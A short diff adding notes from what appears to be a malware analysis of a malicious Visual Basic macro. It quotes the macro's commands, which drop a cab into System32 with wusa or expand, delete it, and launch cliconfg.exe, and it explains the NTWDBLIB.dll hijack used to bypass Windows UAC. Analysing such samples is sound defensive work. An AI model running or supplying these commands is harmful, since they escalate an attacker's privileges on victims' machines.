@@ -1,0 +1,7 @@
+
+Command lines used by the Visual Basic macro: cmd /c wusa %TEMP%\\setup.cab /quiet
+/extract:%SystemRoot%\\System32 && del /f /q %TEMP%\\setup.cab && cliconfg.exe\r\ncmd /c
+expand %TEMP%\\setup.cab -F:*
+%SystemRoot%\\System32 && del /f /q %TEMP%\\setup.cab && cliconfg.exe
+A combination of NTWDBLIB.dll and cliconfg.exe are used to bypass UAC protections; this is a familiar attack on Windows.
+UAC bypass via DLL hijacking requires: A Windows executable with the auto-elevate property in its manifest A Windows executable in a secure directory (%systemroot%\\system32)
